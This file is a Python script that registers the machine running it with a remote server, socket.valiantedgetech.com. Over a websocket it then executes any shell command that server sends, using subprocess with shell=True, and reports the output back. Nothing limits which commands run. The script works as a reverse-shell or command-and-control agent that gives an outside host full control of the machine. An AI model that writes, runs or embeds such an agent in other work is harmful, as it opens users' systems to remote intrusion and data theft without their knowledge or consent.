import asyncio
import websockets
import json
import subprocess
import requests

API_URL = "https://socket.valiantedgetech.com/api/agent/register"
WS_URL_TEMPLATE = "wss://socket.valiantedgetech.com/ws/agent/{agent_id}"

def register_agent(name):
    resp = requests.post(API_URL, json={"name": name})
    if resp.status_code == 200:
        data = resp.json()
        return data["agent_id"], data["token"]
    else:
        print(f"[ERROR] Registration failed: {resp.text}")
        exit(1)

async def main():
    import os, socket
    agent_name = os.getenv("AGENT_NAME") or socket.gethostname()
    agent_id, token = register_agent(agent_name)
    ws_url = WS_URL_TEMPLATE.format(agent_id=agent_id)
    async with websockets.connect(ws_url, extra_headers={"Authorization": f"Bearer {token}"}) as ws:
        print("[INFO] Connected to server")
        while True:
            message = await ws.recv()
            data = json.loads(message)
            command = data.get("command")
            print(f"[INFO] Executing: {command}")
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                await ws.send(json.dumps({"output": output}))
            except Exception as e:
                await ws.send(json.dumps({"output": str(e)}))

if __name__ == "__main__":
    asyncio.run(main())
